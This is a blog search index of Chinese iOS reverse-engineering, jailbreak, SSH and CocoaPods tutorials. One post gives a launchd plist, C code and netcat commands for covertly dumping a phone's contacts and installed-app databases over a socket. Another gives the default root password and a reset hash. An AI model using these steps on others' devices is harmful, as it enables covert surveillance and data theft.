<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[iOS攻防（三）：配置使用Reveal工具逆向别人的App UI界面]]></title>
    <url>%2Farchives%2F4de69069.html</url>
    <content type="text"><![CDATA[你生了气就哭,我一看见你哭就目瞪口呆,就像一个小孩子做了坏事在未受责备之前目瞪口呆一样,所以什么事你先别哭,先来责备我,好吗? ——王小波《爱你就像爱生命》 简介 工欲善其事，必先利其器 Reveal在逆向工程中不仅仅可以用来查看分析别人App的UI层次结构，还可以用来帮助我们在平时开发中快速定位问题。 对于初学者来说，去分析其他优秀App的界面实现，能够帮助快速提升开发能力。 我的环境配置： 越狱iPhone5c 10.3.2 Mac 10.13.5 并且安装有Reveal version 4(8796) 在越狱设备上配置RevealReveal Loader安装 首先在越狱设备的Cydia中输入搜索Reveal2Loader，并且进行安装即可。这一步比较简单，安装后重启SpringBoard即可。 注意安装最新的Reveal2Loader，兼容iOS8/9/10,如果越狱设备系统版本过低，请下载旧版本Reveal Loader安装即可。 导入libReveal.dylib 安装完成Reveal2Loader后查看在/Library/路径下下是否存在RHRevealLoader这个文件夹，并且查看该文件夹中是否有libReveal.dylib这个文件。 可以使用电脑端助手工具查看，也可以在终端查看 12345678// 连接手机ssh root@192.168.1.60 // 进入Library文件夹cd /Library // 查看Library文件夹下文件列表ls -r 文件夹存在 如果存在libReveal.dylib这个文件，则安装Reveal完成。 文件夹不存在 如果不存在libReveal.dylib这个文件，按如下步骤 手动创建RHRevealLoader这个文件夹，可以使用iTools或者Filza，也可以通过指令创建 1mkdir RHRevealLoader 在Mac电脑上打开Reveal，打开Reveal菜单 -&gt; Help -&gt; Show Reveal Library in Finder -&gt; iOS Library 注意：新版本的Reveal已经没有libReveal.dylib这个文件，只存在一个RevealServer.framework文件。 我们需要找到这个库文件下的RevealServer并复制一份到桌面，重命名为libReveal.dylib 将libReveal.dylib这个文件放入手机刚创建的/Library/RHRevealLoader/这个文件夹内。可以使用iTools，也可以通过指令上传 1scp /Users/sevencho/Desktop/libReveal.dylib root@192.168.1.60:/Library/RHRevealLoader/libReveal.dylib 至此,手机的Reveal安装配置完成。重启手机就可以愉快的和新认识的基友小伙伴一起玩耍了。 Reveal的使用在设备上选择想要Reveal的App 在越狱设备上安装完Reveal Loader后就可以在设置中找到Reveal的配置项，在该配置项中我们可以去选择要Reveal的App。 对于越狱手机，手机上安装的所有App都可以Reveal。当然也包括从AppStore下载的，也包括iOS系统自带的。如下所示： 查看App的UI层级 Mac上Reveal查看设备上App的UI层级时可以通过USB进行连接。 也可以使用wifi连接，但要保证你的iOS设备与你的Mac在同一个局域网内。]]></content>
      <categories>
        <category>iOS</category>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS攻防（二）：窃取用户的通讯录信息 & 偷窥用户安装应用列表 & Netcat使用]]></title>
    <url>%2Farchives%2Fbf5c1be0.html</url>
    <content type="text"><![CDATA[咱们应当在一起，否则就太伤天害理啦。 ——王小波《爱你就像爱生命》 简介 通过在iPhone上开启一个开机自启进程，读取用户手机通讯录数据库或者用户应用安装列表，写到标准输出。 开启一个Socket通信端口。 通过使用NetCat将iPhone手机的指定ip端口数据以文件格式传输到Mac桌面上。 了解一下OS X的启动原理 Mac下的启动服务主要有三个地方可配置： 系统偏好设置-&gt;帐户-&gt;登陆项 /System/Library/StartupItems 和 /Library/StartupItems/ launchd 系统初始化进程配置。 launchd是Mac OS下，用于初始化系统环境的关键进程。类似Linux下的init, rc。 启动过程 mac固件激活，初始化硬件，加载BootX引导器。 BootX加载内核与内核扩展(kext)。 内核启动launchd进程。 launchd根据 /System/Library/LaunchAgents /System/Library/LaunchDaemons /Library/LaunchDaemons Library/LaunchAgents ~/Library/LaunchAgents里的plist配置，启动服务守护进程。 LaunchDaemons（后台驻留程序启动）是用户未登陆前就启动的服务(守护进程)LaunchAgents（启动代理）是用户登陆后启动的服务(守护进程) 理解几个基础概念：/System/Library和/Library和~/Library目录的区别？ /System/Library目录是存放Apple自己开发的软件。 /Library目录是系统管理员存放的第三方软件。 ~/Library/是用户自己存放的第三方软件。 几个目录下plist文件格式及每个字段的含义： 因为iOS和Macd都是基于Unix，所以启动过程基本是类似的。 Key Description Required Label The name of the job yes ProgramArguments Strings to pass to the program when it is executed yes UserName The job will be run as the given user, who may not necessarily be the one who submitted it to launchd. no inetdCompatibility Indicates that the daemon expects to be run as if it were launched by inetd no Program The path to your executable. This key can save the ProgramArguments key for flags and arguments. no onDemand A boolean flag that defines if a job runs continuously or not no RootDirectory The job will be?chrooted?into another directory no ServiceIPC Whether the daemon can speak IPC to launchd no WatchPaths Allows launchd to start a job based on modifications at a file-system path no QueueDirectories Similar to WatchPath, a queue will only watch an empty directory for new files no StartInterval Used to schedule a job that runs on a repeating schedule. Specified as the number of seconds to wait between runs. no StartCalendarInterval Job scheduling. The syntax is similar to cron. no HardResourceLimits Controls restriction of the resources consumed by any job no LowPriorityIO Tells the kernel that this task is of a low priority when doing file system I/O no Sockets An array can be used to specify what socket the daemon will listen on for launch on demand no 配置一个Hack通讯录进程的plist文件 我们需要通过一个plist文件在系统加载时候启动一个进程。 如：一个名为hack的进程，该进程加载的可执行文件hack的路径是/usr/bin/hack。 配置的plist如下： plist源码如下： Program ： 进程可执行文件加载路径 StandardErrorPath ：标准错误路径 ProgramArguments ： 用户登陆后启动的服务路径 inetdCompatibility ：是一个因特网超级服务器(即inetd守护进程）来简化守护进程的编写。 SockServiceName ： Socket通信端口名称 1234567891011121314151617181920212223242526272829303132333435&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE plist PUBLIC &quot;-//Apple Computer//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;&lt;!-- hack.plist Created by 曹雪松 on 2018/7/5. Copyright (c) 2018 曹雪松. All rights reserved.--&gt;&lt;plist version=&quot;1.0&quot;&gt; &lt;dict&gt; &lt;key&gt;Program&lt;/key&gt; &lt;string&gt;/usr/bin/hack&lt;/string&gt; &lt;key&gt;StandardErrorPath&lt;/key&gt; &lt;string&gt;/dev/null&lt;/string&gt; &lt;key&gt;SessionCreate&lt;/key&gt; &lt;true/&gt; &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;/usr/bin/hack&lt;/string&gt; &lt;/array&gt; &lt;key&gt;inetdCompatibility&lt;/key&gt; &lt;dict&gt; &lt;key&gt;Wait&lt;/key&gt; &lt;false/&gt; &lt;/dict&gt; &lt;key&gt;Sockets&lt;/key&gt; &lt;dict&gt; &lt;key&gt;Listeners&lt;/key&gt; &lt;dict&gt; &lt;key&gt;SockServiceName&lt;/key&gt; &lt;string&gt;55&lt;/string&gt; &lt;/dict&gt; &lt;/dict&gt; &lt;/dict&gt;&lt;/plist&gt; 将plist文件传送到至iPhone/System/Library/LaunchDaemons/ 下 1scp /Users/sevencho/Desktop/hack.plist root@192.168.1.60:/System/Library/LaunchDaemons/hack.plist 读取通讯录 &amp; 用户安装App列表 的执行程序 我们只要能拿出AddressBook.sqlitedb/itunesstored2.sqlitedb就可以拿到用户的数据。 AddressBook的数据都在/var/mobile/Library/AddressBook/AddressBook.sqlitedb中， iTunes Store的数据都在/var/mobile/Library/com.apple.itunesstored2.sqlitedb/itunesstored2.sqlitedb中， 写一个函数用于读取用户通讯录数据库或者用户安装App列表。 12345678910111213141516171819202122232425262728//// hack.c//// Created by 曹雪松 on 2018/7/5.// Copyright © 2018 曹雪松. All rights reserved.//#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#define FILE "/var/mobile/Library/AddressBook/AddressBook.sqlitedb" // 手机的通讯录数据库路径// #define FILE "/var/mobile/Library/com.apple.itunesstored2.sqlitedb/itunesstored2.sqlitedb" // 用户安装app列表文件int main()&#123; int fd = open(FILE, O_RDONLY); // 读数据库文件，返回文件句柄标识 char buf[128]; int ret = 0; if(fd &lt; 0) return -1; while (( ret = read(fd, buf, sizeof(buf))) &gt; 0)&#123; // 将文件读进buff中 write( fileno(stdout), buf, ret); // 写到标准输出中 &#125; close(fd); return 0;&#125; 生成可执行文件 在hack.c所在目录执行，也可以直接指定文件路径 1xcrun -sdk iphoneos clang -arch armv7s -o hack hack.c 可执行文件签名，并传输至iPhone手机/usr/bin目录 12ldid -S hackscp hack root@192.168.1.60:/usr/bin/hack 新开一个终端，SSH连接电脑。 获取AddressBook &amp; 用户安装App列表数据 利用netcat，将指定服务端口的数据以文件的形式传输到电脑的当前目录下，抓取设备 AddressBook 或者 用户安装App列表信息。 55为之前plist文件配置的Socket服务名称。 123// 根据自己可执行程序路径，选择获取的数据类型nc 192.168.1.60 55 &gt; addressBook.sqlitedb // 通讯录nc 192.168.1.60 55 &gt; itunesstored2.sqlitedb // App列表 利用netcat获取的addressBook.sqlitedb是空的。 使用如下指令监控下过程提示连接拒绝，但是192.168.1.60是可以ping通的。 使用ps aux指令查看所有启动的进程，貌似没有找到我们的hack进程。 暂时还没有找到解决方法，大家可以一起帮忙排查原因。 12nc -v 192.168.1.60 55// nc: connectx to 192.168.1.60 port 55 (tcp) failed: Connection refused 如果文件有数据，可以使用string命令查看文件内容 1strings itunesstored2.sqlitedb 参考 iOS攻防——（二）如何窃取用户的通讯录信息 Mac OS启动服务 守护进程和inetd超级服务器 C语言之fileno()函数 对stdin，stdout 和STDOUT_FILENO，STDIN_FILENO的学习 nc命令详解]]></content>
      <categories>
        <category>iOS</category>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS攻防（一）： iPhone手机越狱 & SSH]]></title>
    <url>%2Farchives%2Fe38331a.html</url>
    <content type="text"><![CDATA[人在年轻时，最头疼的一件事就是决定自己这一生要做什么。——王小波 《工作与人生》 前言 很早之前就想研究了解一下iOS越狱开发和逆向相关的知识，然后就买了《iOS应用逆向工程》这本’小黄书’，也查了查相关的资料，比较出名的可能就是iOS女神念茜的iOS攻防系列文章了。 但是由于自身的惰性和其他的外界因素，导致’小黄书’翻了几章后就在公司的办公桌上处于长时间的休眠状态，而念茜的文章年代稍微比较久远也在读了两篇后被遗忘在chrome的书签里面，真真的从入门到放弃。🤣 最近这段时间刚好工作行有一些闲暇的时间，偶尔在网上看到《iOS 应用逆向与安全》这本书，这是自“小黄书”后的又一本关于逆向安全的书。随想再从头开始学习下iOS越狱开发和逆向相关的知识，并将学习过程及采坑经验记录于此，希望这一次会有始有终… 这是本系列的第一篇，希望不会成为最后一篇🐒😂 正文 现在Apple公司已经越来越注重开放性，iPhone已经不像几年前那样异常封闭，许多以前只有越狱才有的功能也慢慢的原生自带，越来越多的小伙伴已经没有了当前那种越狱的激情，而随着越来越多的越狱大神隐退、越狱组织解散，辉煌了近10年的越狱也渐渐走向了没落。 但如果想借鉴别人的App某个功能实现思路或者加强我们自己App的安全性，那么最好的途径就是从越狱开发和逆向入手，而这一切的开始的基础：你必须要有一部越狱过的iPhone手机。 iOS 9x 32位系统越狱配置 机型：iPhone4s 版本：美版 系统：9.3.2 越狱工具 使用Home Depot越狱工具，仅支持32手机系统，如果是64位手机系统请直接使用各种助手越狱 支持设备（32位设备）： iPhone 4s、iPhone 5、iPhone 5c、iPad 2、iPad 3、 iPad 4、iPad mini、iPod touch 5G 支持iOS系统版本： iOS 9.1、iOS 9.2.1、iOS 9.3、iOS 9.3.2、iOS 9.3.3、iOS 9.3.4 越狱须知: 越狱前请备份您的重要资料以免造成丢失； 本次越狱属于不完美越狱，若设备重启，则会恢复到未越狱状态，Cydia 及已装得越狱应用会闪退，越狱插件也将失效，需要重新激活；但是安装插件Community Offsets后，重启设备越狱也不会失效，可实现完美越狱。 越狱工具请在这里下载 越狱步骤 1、首先下载签名工具以及越狱ipa，将签名工具解压到电脑桌面，打开Impactor，手机连接电脑后软件会读取到手机信息； 2、然后把32位iOS9越狱ipa（MixtapePlayer.ipa）拖入软件里； 3、提示输入你的Apple ID账号，和Apple ID密码。 4、Apple ID验证完成后软件会自动安装到手机里，可以在手机桌面看到Home Depot的图标，这个就是越狱工具； 5、接下来进手机设置-通用-设备管理，找到你的ID后点进去并点击信任（设备须保持联网状态）； 6、然后回到设备桌面，运行Home Depot应用， 点击Prepare for jailbreak， 再依次点击Accept –&gt; Dismiss –&gt; Proceed With Jailbreak –&gt; Begin Installation –&gt; Use Provided Offsets； 等待设备自动重启后，Cydia就会出现在手机桌面则代表越狱完成，如果越狱重启后没有出现Cydia，则可以多试几次，直到成功为止； 成功后打开Cydia，添加插件源「http://repo.tihmstar.net」，在Cydia中搜索「Community Offsets」并插件安装，安装后即使重启越狱也不会失效，Cydia也不会闪退，相当于完美越狱。 iOS 10x 32位系统越狱配置 机型：iPhone5c 版本：美版 系统：10.3.2 越狱工具 使用h3lix-RC5越狱工具，仅支持32手机系统，如果是64位手机系统请直接使用各种助手越狱。 支持设备（32位设备）： iPhone 4s、iPhone 5、iPhone 5c、iPad 2、iPad 3、 iPad 4、iPad mini、iPod touch 5G 支持iOS系统版本： iOS 10 - 10.3.x 越狱须知: 越狱前请备份您的重要资料以免造成丢失； 本次越狱属于不完美越狱，若设备重启，则会恢复到未越狱状态，Cydia 及已装得越狱应用会闪退，越狱插件也将失效，需要重新激活； 越狱工具 h3lix Cydia Impactor 越狱步骤 1、首先下载签名工具以及越狱ipa，将签名工具解压到电脑桌面，打开Impactor，手机连接电脑后软件会读取到手机信息； 2、然后把32位iOS10x越狱ipa（h3lix-RC5.ipa）拖入软件里； 3、提示输入你的Apple ID账号，和Apple ID密码。 4、Apple ID验证完成后软件会自动安装到手机里，可以在手机桌面看到h3lix的图标，这个就是越狱工具； 5、接下来进手机设置-通用-设备管理，找到你的ID后点进去并点击信任（设备须保持联网状态）； 6、然后回到设备桌面，运行h3lix应用， 点击屏幕中间的jailbreak， 等待设备自动重启后， 如果提示如下错误，可不用管 Cydia就会出现在手机桌面则代表越狱完成，如果越狱重启后没有出现Cydia，则可以多试几次，直到成功为止； 插件安装 iphone越狱后就需要安装一些插件来协助进行一些逆向辅助操作。 如果部分需要的插件找不到，可以先尝试添加一些Cydia源。如下是我添加的源地址： tihmstar: http://repo.tihmstar.net多玩源: http://yuan.duowan.comBigBoss: http://apt.thebigboss.org/repofiles/cydia/雷锋源 http://apt.abcydia.com 越狱必备工具(20180702)： openSSH // 远程控制，如远程登录 (如果越狱工具自带Dropbear不需要安装) MobileTerminal // 无法安装 可用MTerminal代替 MTerminal LLVM+Clang // 32位手机需要下载32位的才可以安装，否则无法安装(试了两台手机都没有安装成功，不知道是不是以为32位系统或者16G的缘故) LD64 Darwin CC Tools adv-cmds: 执行 ps 命令报错，需要安装这个工具； iFile: (没有安装成功) 可以安装Filza Filza：在手机上查看文件目录；(必装) Apple File Conduit”2”，安装完后iFunbox显示越狱状态 scp：终端命令，把远程设备的文件复制到另一个设备； 还需要的软件： Cydia Translations // 安装后自带 Cydia Substrate // 允许第三方开发者在越狱系统的方法中打一些补丁或扩展方法。 Cydia Installer // 安装后自带 SSHSSH通过WiFi连接手机 OpenSSH原是一个在Linux下很实用的一个软件。iPhone本身就是一个运行BSD系统(可认为是一种Liunx)的硬件，因此，Cydia的作者Saurik把OpenSSH这一软件移植到了iOS平台上，并且简化了安全认证密钥的繁琐，使之成为一款可以在iPhone上运行的Cydia插件。 关于ssh(Secure Shell)详细资料请自行搜索相关资料，可以简单理解成『远程登录』，可以通过一台设备远程登陆另一台设备。 保证你的Mac和iPhone在同一网段 确定iPhone的IP 远程登陆 Terminal输入 1ssh root@xxx.xxx.xxx.xxx // xxx.xxx.xxx.xxx为手机ip地址 如果系统是iOS10.3以上，默认是不能直接使用ssh通过wifi或者USB访问手机的，详情请参考iPhone10.3.X越狱后SSH连接不上的问题（已解决） 1.卸载手机上的OpenSSL和Openssh 2.添加源：http://cydia.ichitaso.com/test 3.搜索并下载：dropbear 4.安装完毕，执行ssh root@deviceIP，默认密码为alpine（也可以在iPhone里下载ssh软件进行连接测试） 5.成功后，再重新安装openssh和OpenSSL了（经测试不会影响SSH连接iPhone）。 第一次连接会提醒你是否连接，输入yes继续，输入密码，初始密码是alpine。 建议将改密码改掉，因为在默认密码的情况下，任何人都可以尝试登陆你的设备。 Ikee, iOS上的一种蠕虫病毒, 通过使用默认密码alpine入侵安装了openssh的越狱设备, 然后所有数据, 包括电话本, 短信, 甚至Apple ID都有可能被窃取.所以强烈建议您修改ssh密码 在登录之后，你可以更改你的密码： 1passwd root // 提示输入两次新密码即可修改 成功后可查看手机文件目录 SSH通过USB连接手机 比WIFI响应速度快，网络环境无限制 usbmuxd是网上开源社区，貌似是国外牛人倾力打造的一个专门针对该功能开源库 通过brew来安装（当然也可以自己去下源码手动安装，由于依赖项比较多，所以很繁琐） 1brew install usbmuxd usbmuxd 自带工具iproxy，iproxy 可以快捷的操作连接iPhone等操作。由于Mac上只支持4位的端口号，所以需要把iPhone的默认端口22映射到Mac上，相当于建立一个Mac和iPhone之间的通道。 12iproxy 7777 22// waiting for connection 以上命令就是把当前连接设备的22端口(SSH端口)映射到电脑的7777端口，那么想和设备22端口通信，直接和本地的7777端口通信就可以了。 终端提示 waiting for connection ，表示这两个端口之间已经可以通信了，保留当前终端(如果关闭就停止端口之间的通信了)，新建另一个终端输入如下指令 1ssh -p 7777 root@127.0.0.1 如果是第一次使用USB连接手机，会提示如下信息，输入yes继续 1234The authenticity of host &apos;[127.0.0.1]:7777 ([127.0.0.1]:7777)&apos; can&apos;t be established.ECDSA key fingerprint is SHA256:rBkW26LHWZbqrbfOsrkSCeLN1gr3fADxIF5PWB8VXDI.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added &apos;[127.0.0.1]:7777&apos; (ECDSA) to the list of known hosts. 如果没有修改过root密码，则输入默认alpine，修改过，则输入修改过密码，完成后即可连接上iPhone。 配置免ssh密码登陆 每次连接手机都需要输入密码比较麻烦，可以通过如下配置免ssh密码登陆 如果本人是做iOS开发的，项目用到了GIT版本控制，一般都配置SSH密钥了。密钥已经存在了电脑的./ssh目录中，如果没有配置，那么可手动重新生成SSH密钥，如: 1ssh-keygen -t rsa -b 4096 -C &quot;your_email&quot; 生成完成后，我们会在./ssh目录中发现id_rsa.pub公钥这个文件。然后我们把它copy出来放到个人目录下，并重命名，比如： 1cp /Users/SevenCho/.ssh/id_rsa.pub ~/authorized_keys 手动SSH进入设备中，或者通过Filza，查看是否存在var/root/.ssh目录，如果没有，我们手动创建下。可通过SSH连接后mkdir创建，或者Filza手动创建。 创建后我们把authorized_keys拷贝到设备中，可利用SCP命令： 1scp ~/authorized_keys root@iphone ip:/var/root/.ssh // iphone ip 为你手机的ip地址 然后按正常连接步骤我们就可以直接SSH连接的时候不用输入密码了。 这个时候，如果我们使用tweak打包时候，也不会再让我们输入SSH密码了。 重置ssh登陆密码 如果你不幸忘记了ssh密码，可以在Cydia中下载Filza软件，通过Filza找到/private/etc/master.password文件，文件中会有以下一段： root:xxxxxxxxxxxxx:0:0::0:0:SystemAdministrator:/var/root:/bin/shmobile:xxxxxxxxxxxxx:501:501::0:0:MobileUser:/var/mobile:/bin/sh 将root:及mobile:后面的13个x字符处修改成/smx7MYTQIi2M，修改后保存此文件，你iphone的ssh密码就重新回到默认的alpine 交叉编译 交叉编译指在一个平台上生成另一个平台上的可执行代码。如我们将会在MAC上编写编译可在iPhone上运行的可执行文件。 编译是由编译器完成的，所以我们首先要找到合适的编译器。关于目前Apple公司开源及很多大公司使用和维护的Clang编译器详细资料请看结构化编译器前端 Clang 介绍 编写代码 12345678touch helloworld.c // 新建c文件open helloworld.c // 打开.c文件，编写测试代码，如下面代码：#include &lt;stdio.h&gt; int main()&#123; printf(&quot;Hello world !!!\n&quot;); return 0; &#125; 生成可执行文件 生成可在iPhone平台运行的二进制可执行文件 iOS的指令集参考文章结尾 12// 格式：xcrun -sdk iphoneos clang -arch armv7s -o [目标文件名] [源文件名]xcrun -sdk iphoneos clang -arch armv7s -o helloworld helloworld.c 传输可执行文件 通过ssh传输本地文件到iPhone（服务器） 12// scp /path/filename username@servername:/path/filenamescp helloworld root@192.168.1.42:/helloworld 关于iOS10.2系统越狱后无法调用scp，可参考[Tutorial] How to fix scp on Yalu / Dropbear 坑：使用iPhone5 iOS10.3 还是无法使用scp传输文件，后来发现因为是32位系统，而使用上面解决方法下载的scp是64位的，手动安装授权32位就可以了，如下 先下载scp二进制文件及相关库文件：scp、libcrypto.0.9.8.dylib、libcrypto.dylib 在电脑上用iTools把scp文件导入到usr/bin目录中，把另外两个文件导入到usr/lib目录中 通过手机MTerminal，登陆进来root模式 进入usr/bin目录，执行下列命令 12ldid -S scpchmod 777 scp 进入usr/lib目录 12chmod 755 libcrypto.0.9.8.dylibchmod 755 libcrypto.dylib 将iPhone（服务器）文件传输到本地 12// scp username@servername:/source/path/filename /des/path/filenamescp root@192.168.1.42:/iphone/path/helloworld /mac/path/helloworld 查看iPhone文件目录是否存在对应文件helloworld，在终端执行可执行文件 传完可执行文件后, 此时可执行文件并没有权限, 所以要执行以下命令给权限: 1chmod a+x helloworld 运行可执行文件 如果执行失败，报Killed: 9，可能是因为执行文件没有签名，使用ldid -S helloworld签名即可。 1./helloworld 注意 如果越狱成功，一定要安装可以远程访问手机的工具，和手机端可以查看越狱系统文件的工具。（以防手贱把Cydia给误删了，需要恢复） 千万要注意：删除某些安装的工具的时候有可能会把Cydia也给一起删除的。 如果想重新使用Apple ID签名越狱, 输入Apple ID账号密码后遇到如下错误 123provision.cpp:81ios/submitDevelopmentCSR =7460You already have a current IOS Development certificate or a pending certificate request. 此时需要删除上一个certificate，操作步骤： 选择菜单栏Xcode -&gt; revokeCertificates 如果revokeCertificates失败，提示如下错误 1progress hpp：87_assert false 下载旧版本Impactor，如Impactor_0.9.42, 使用旧版本软件重新revokeCertificates revokeCertificates成功如下 关于生成可执行文件采用的iOS的指令集 armv6 iPhone、iPhone 3G iPod 1G、iPod 2G armv7 iPhone 3GS、iPhone 4 iPod 3G、iPod 4G、iPod 5G iPad、iPad 2、iPad 3、iPad Mini armv7s iPhone 5、iPhone 5C iPad 4 arm64 iPhone 5S iPhone 6 iPhone 6Plus 以及之后的 iPad Air, Retina iPad Mini 以及之后的 参考 iOS攻防——（一）ssh登陆与交叉编译 《iOS 应用逆向与安全》读后感 不用换ID，完美解决 Cydia Impactor 错误81 iPhone6s 10.3.1越狱失败 提示./plist.hpp:201 not PLIST_STRING 32位设备iOS 10-10.3.x越狱工具h3lix发布 32位设备iOS9.1-9.3.4越狱图文教程 iPhone10.3.X越狱后SSH连接不上的问题（已解决） [Tutorial] How To Access SSH Using Dropbear In iOS 10.3.x To Fix Filza’s Root Permission Using Your Device! SSH Over USB [Tutorial] How to fix scp on Yalu / Dropbear]]></content>
      <categories>
        <category>iOS</category>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[创建自己的CocoaPods公有库]]></title>
    <url>%2Farchives%2F2e7b1d7b.html</url>
    <content type="text"><![CDATA[我把我整个灵魂都给你，连同它的怪癖，耍小脾气，忽明忽暗，一千八百种坏毛病。它真讨厌，只有一点好，爱你。——王小波《爱你就像爱生命》 前言什么是CocoaPods CocoaPods 是一个 objc/swift 的第三类库依赖管理工具，而其本身是利用 ruby 的依赖管理 gem 进行构建的. 通过CocoaPods工具我们可以为项目添加被称为“Pods”的依赖库（这些类库必须是CocoaPods本身所支持的），并且可以轻松管理其版本。 CocoaPods的好处 1、在引入第三方库时它可以自动为我们完成各种各样的配置，包括配置编译阶段、连接器选项、甚至是ARC环境下的-fno-objc-arc配置等。 2、使用CocoaPods可以很方便地查找新的第三方库，这些类库是比较“标准的”，而不是网上随便找到的，这样可以让我们找到真正好用的类库。 CocoaPods安装 关于CocoaPods安装请自行百度/谷歌，相关资料已经介绍的非常详尽。 更详细的文档请参考官方文档 可以在这里深入理解 CocoaPods 如何制作自己的CocoaPods（公有）库 想要制作自己的CocoaPods（公有）库，我们需要先大概了解一下CocoaPods的两个文件Podfile / Podspec Podfile podfile 是一个文件，用于定义项目所需要使用的第三方库。 该文件支持高度定制，你可以根据个人喜好对其做出定制。更多相关信息，请查阅 Podfile 指南。 Podspec .podspec 也是一个文件，该文件描述了一个库是怎样被添加到工程中的。它支持的功能有：列出源文件、framework、编译选项和某个库所需要的依赖等。 在我们执行pod install 命令加载第三方库的时候, 会先从远程Podspecs仓库拉取最新的包括版本信息在内的所有的第三方库的列表。 存储在本地路径 ~/.cocoapods 中，先显示系统隐藏文件后才可以看到隐藏文件。 1defaults write com.apple.finder AppleShowAllFiles -boolean true ; killall Finder 使用终端进入查看仓库的远程地址 12345cd ~/.cocoapods/repos/mastergit remote -v// 拉取和更新地址origin https://github.com/CocoaPods/Specs.git (fetch)origin https://github.com/CocoaPods/Specs.git (push) https://github.com/CocoaPods/Specs.git 实际就是CocoaPods的GitHub仓库地址。 我们如果一直进入~/.cocoapods/repos/master 就会发现里面的每一个文件夹下都是三方库列表 每一个三方库文件下存放的是对应的版本号文件夹 而对应的版本号文件夹里面则只存在唯一的一个以 三方库名称.podspec.json的文件, 我们看一下GoogleMaps大概的内容 1234567891011121314151617181920&#123; "authors": "Google, Inc.", "description": "Use the Google Maps SDK for iOS to enrich your app with interactive maps, immersive Street View panoramas, and detailed information from Google's Places database.", "homepage": "https://developers.google.com/maps/documentation/ios/", "license": &#123; // 开源协议 // ... &#125;, "name": "GoogleMaps", // 三方库名称 "platforms": &#123; // 三方库平台及版本 "ios": "8.0" &#125;, "preserve_paths": [ // ... ], "source": &#123; "http": "https://dl.google.com/dl/cpdc/f4086b0aa122de6c/GoogleMaps-2.7.0.tar.gz" // 三方库源码 &#125;, "summary": "Google Maps SDK for iOS.", // 三方库描述 "version": "2.7.0", // 三方库版本 &#125; 我们尝试在终端搜索一下第三方库GoogleMaps 1234567891011// pod search GoogleMaps-&gt; GoogleMaps (2.7.0) // 三方库名称 Google Maps SDK for iOS. // 三方库描述 pod &apos;GoogleMaps&apos;, &apos;~&gt; 2.7.0&apos; // 三方库版本 - Homepage: https://developers.google.com/maps/documentation/ios/ - Source: https://dl.google.com/dl/cpdc/f4086b0aa122de6c/GoogleMaps-2.7.0.tar.gz // 三方库源码 - Versions: 2.7.0, 2.6.0, 2.5.0, 2.4.0, 2.3.1, 2.3.0, 2.2.0, 2.1.1, 2.1.0, 2.0.1, 2.0.0, 1.13.2, 1.13.1, 1.13.0, 1.12.3, 1.12.2, 1.12.1, 1.12.0, 1.11.1, 1.11.0, 1.10.5, 1.10.4, 1.10.3, 1.10.2, 1.10.1, 1.10.0, 1.9.2 [master repo] - Subspecs:// ... 我们平时在pod search第三方库后出现的结果其实都是三方库名称.podspec.json这个文件的内容，所以我们只做自己的CocoaPods库，也要从整个文件入手。 正式开始注册 CocoaPods 账号 因为我们的是用CocoaPods统一管理我们的自己的开源库，所以需要一个CocoaPods账号用来发布库。 我们使用终端来进行注册，在终端输入下面的指令、回车： 123// gitHub_email ： 注册CocoaPods的邮箱， 我使用的是和注册GitHub一样的邮箱。// your_user_name ：你注册CocoaPods的用户名 pod trunk register gitHub_email &apos;your_user_name&apos; --verbose 成功后终端输入下面信息，CocoaPods 会发一个确认邮件到你的邮箱上，登录你的邮箱进行确认。 1[!] Please verify the session by clicking the link in the verification email that has been sent to gitHub_email 确认完成后，输入如下指令查看注册信息 12345678// pod trunk me- Name: your_register_name // 你的注册昵称 - Email: your_register_email // 你的注册邮箱 - Since: June 26th, 03:26 - Pods: None - Sessions: - June 26th, 03:26 - November 1st, 03:28. IP: 119.136.114.95 创建Git仓库 在 GitHub 上创建一个公开项目，项目中必须包含这几个文件 LICENSE: 开源许可证 README.md: 库的使用介绍文件 你的开源库代码 你的三方库名称.podspec : CocoaPods 的描述文件，这个文件非常重要 这里我们以我仿写的一个demo为例子,如下图： XSSecurityCodeButton-Demo是一个演示项目 XSSecurityCodeButton是一个演示项目 LICENSE开源许可证，如何创建请自行百度/谷歌，非常简单。 README.md库的使用介绍文件，如何创建请自行百度/谷歌，非常简单。 XSSecurityCodeButton.podspecCocoaPods的描述文件 创建.podspec 进入你需要制作开源库的项目根目录 终端执行下面的指令，会在你的仓库下生成 XSSecurityCodeButton.podspec文件 12345// XSSecurityCodeButton 我的项目名称，请自行修改pod spec create XSSecurityCodeButton// 执行完成生成会输入如下信息Specification created at XSSecurityCodeButton.podspec XSSecurityCodeButton.podspec文件配置及修改请参考下面（已删除部分无用的干扰内容），重要的地方我已经给出注释。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152Pod::Spec.new do |s| # ――― Spec Metadata ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # s.name = "XSSecurityCodeButton" s.version = "0.0.1" # 版本号 与 你仓库的 标签号 对应 s.summary = "XSSecurityCodeButton 是一个简约的验证码按钮." s.description = &lt;&lt;-DESC # 这里的描述，必须比s.summary的长度要长。 DESC s.homepage = "https://github.com/SevenCho/XSSecurityCodeButton" # 你的源码页 # s.screenshots = "www.example.com/screenshots_1.gif", "www.example.com/screenshots_2.gif" # ――― Spec License ――――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # s.license = "MIT" # 开源证书 # s.license = &#123; :type =&gt; "MIT", :file =&gt; "FILE_LICENSE" &#125; # ――― Author Metadata ――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # s.author = &#123; "库发布者" =&gt; "邮箱" &#125; # Or just: s.author = "库发布者" # s.authors = &#123; 